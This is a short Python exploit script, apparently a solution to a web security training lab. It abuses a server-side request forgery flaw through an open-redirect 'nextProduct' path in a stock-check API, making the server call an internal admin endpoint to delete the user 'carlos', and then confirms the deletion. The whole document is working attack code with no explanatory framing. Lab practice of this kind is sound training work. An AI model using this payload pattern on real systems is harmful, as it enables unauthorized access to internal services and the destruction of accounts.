import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def delete_user(url):
    url_delete_ssrf_payload="/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos"
    path_check_stock='/product/stock'
    para={"stockApi":url_delete_ssrf_payload}
    r=requests.post(url+path_check_stock,data=para,verify=False)
    #check user if delete
    url_admin="/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/"
    para2={"stockApi":url_admin}
    r=requests.post(url+path_check_stock,data=para2,verify=False)
    if 'Carlos' not in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful")


def main():
    if len(sys.argv) !=2:
        print("(+) usage error")
        print("(+) example %s www.example.com" ,sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1]
    print("deleting.........")
    delete_user(url)    

if __name__ == '__main__':
    main()
